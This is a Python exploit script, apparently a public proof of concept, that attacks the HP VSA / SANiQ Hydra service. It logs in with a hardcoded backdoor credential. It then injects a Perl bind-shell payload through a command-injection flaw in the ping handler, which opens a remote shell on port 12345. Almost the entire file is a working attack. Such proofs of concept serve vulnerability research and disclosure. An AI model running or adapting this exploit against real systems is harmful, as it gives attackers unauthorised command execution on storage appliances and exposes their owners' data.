 
&#039;&#039;&#039; ==================================
          Pseudo documentation
================================== &#039;&#039;&#039;
 
# HP VSA / SANiQ Hydra client
# Nicolas Gr√©goire <nicolas.gregoire@agarri.fr>
# v0.5
 
&#039;&#039;&#039; ==================================
          Target information
================================== &#039;&#039;&#039;
 
HOST = &#039;192.168.201.11&#039; # The remote host
PORT = 13838        # The hydra port
 
&#039;&#039;&#039; ==================================
             Imports
================================== &#039;&#039;&#039;
 
import getopt
import re
import sys
import binascii
import struct
import socket
import os
 
&#039;&#039;&#039; ==================================
        Define functions
================================== &#039;&#039;&#039;
 
# Some nice formatting
def zprint(str):
    print &#039;[=] &#039; + str
 
# Define packets
def send_Exec():
    zprint(&#039;Send Exec&#039;)
     
    # RESTRICTIONS
    # You can&#039;t use "/" in the payload
    # No Netcat/Ruby/PHP, but telnet/bash/perl are available
 
    # METASPLOIT PAYLOAD
    cmd = "perl -MIO -e &#039;$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,12345,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>&#039;"
 
    # COMMAND INJECTION BUG
    data = &#039;get:/lhn/public/network/ping/127.0.0.1/foobar;&#039; + cmd + &#039;/&#039;
 
    # EXPLOIT
    zprint(&#039;Now connect to port 12345 of machine &#039; + str(HOST))
    send_packet(data)
 
def send_Login():
    zprint(&#039;Send Login&#039;)
    data = &#039;login:/global$agent/L0CAlu53R/Version "8.5.0"&#039; # Backdoor
    send_packet(data)
 
# Define the sending function
def send_packet(message):
 
    # Add header
    ukn1 = &#039;\x00\x00\x00\x00\x00\x00\x00\x01&#039;
    ukn2 = &#039;\x00\x00\x00\x00&#039; + &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039; + &#039;\x00\x00\x00\x14\xff\xff\xff\xff&#039;
    message = message + &#039;\x00&#039;
    data = ukn1 + struct.pack(&#039;!I&#039;, len(message)) + ukn2 + message
 
    # Send & receive
    s.send(data)
    data = s.recv(1024)
    zprint(&#039;Received : [&#039; + data + &#039;]&#039;)
 
&#039;&#039;&#039; ==================================
           Main code
================================== &#039;&#039;&#039;
 
# Print bannner
zprint(&#039;HP Hydra client&#039;)
zprint(&#039;Attacking host &#039; + HOST + &#039; on port &#039; + str(PORT))
 
# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
s.connect((HOST, PORT))
 
# Attack !
send_Login()
send_Exec()
 
# Deconnect
s.close
 
# Exit
zprint(&#039;Exit&#039;)



